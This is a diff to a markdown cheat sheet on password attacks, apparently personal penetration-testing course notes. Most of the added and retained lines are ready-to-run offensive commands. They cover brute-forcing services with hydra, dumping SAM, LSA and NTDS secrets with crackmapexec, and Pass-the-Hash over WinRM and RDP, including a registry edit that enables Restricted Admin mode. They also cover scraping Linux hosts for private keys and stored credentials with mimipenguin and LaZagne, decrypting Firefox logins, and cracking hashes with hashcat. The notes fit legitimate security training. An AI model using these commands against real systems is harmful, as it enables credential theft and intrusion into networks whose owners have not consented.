@@ -1,11 +1,18 @@
 # Password Attacks
 
-> Status: 🟨 In progress
+> Status: ✅ Complete
 > Date started: 2026-10-26
-> Date finished: 
+> Date finished: 2026-10-26
 
 ## 1. Goal
 Obtain, dump, and crack credentials: build wordlists, attack services remotely, loot hashes from Windows/Linux hosts, and crack them offline.
+
+## Default / reused credentials
+First thing to try — one overlooked router/printer/firewall with factory creds opens the network:
+```bash
+creds search mssql            # DefaultCreds-Cheat-Sheet tool (default creds DB by product)
+```
+Also check CIRT.net and the DefaultCreds-Cheat-Sheet repo. Always test reuse of any found password across other hosts/services.
 
 ## Wordlist generation
 ```bash
@@ -23,7 +30,10 @@ hydra -L users.txt -P pass.txt <service>://<ip>
 crackmapexec smb <ip> --local-auth -u <u> -p <p> --sam          # local SAM
 crackmapexec smb <ip> --local-auth -u <u> -p <p> --lsa          # LSA secrets
 crackmapexec smb <ip> -u <u> -p <p> --ntds                      # domain NTDS (DA)
-evil-winrm -i <ip> -u Administrator -H "<NThash>"               # Pass-the-Hash login
+evil-winrm -i <ip> -u Administrator -H "<NThash>"               # Pass-the-Hash (WinRM)
+# PtH over RDP — first enable Restricted Admin mode on the target, then /pth:
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+xfreerdp /v:<ip> /u:<user> /pth:<NThash>
 ```
 
 ## Windows local credential looting
@@ -45,6 +55,14 @@ find / -name "*.cnf" -o -name "*.conf" 2>/dev/null | xargs grep -iE "user|pass" 
 grep -rnw "PRIVATE KEY" / 2>/dev/null       # SSH private keys
 find / -name "*.db" -o -name "*.sql" 2>/dev/null
 tail -n5 /home/*/.bash*                      # history
+grep -rnw "ssh-rsa" /home/* 2>/dev/null      # authorized_keys / pubkeys
+cat /etc/crontab ; ls -la /etc/cron.*/       # creds in scheduled jobs
+# automated cred dumpers:
+./mimipenguin.sh                             # scrape creds from memory (needs root)
+python3 lazagne.py all                       # pull stored creds from many apps (browsers, etc.)
+# Firefox stored logins:
+cat ~/.mozilla/firefox/*.default-release/logins.json | jq .
+python3 firefox_decrypt.py                   # decrypt them
 ```
 
 ## Cracking (hashcat / john)
@@ -52,7 +70,9 @@ tail -n5 /home/*/.bash*                      # history
 # common modes:
 hashcat -m 1000 ntlm.txt rockyou.txt          # NTLM
 hashcat -m 1800 -a 0 unshadowed.txt rockyou.txt   # Linux sha512crypt
+hashcat -m 500 md5crypt.txt rockyou.txt       # md5crypt  |  -m 22100 BitLocker
 hashcat -m 13100 ...  # Kerberoast TGS  |  -m 18200 AS-REP  |  -m 5600 NetNTLMv2  |  -m 13400 KeePass
+# append --show to print already-cracked results from the potfile
 # Linux shadow:
 unshadow /etc/passwd /etc/shadow > unshadowed.txt
 # *2john extractors (then john/hashcat the output):
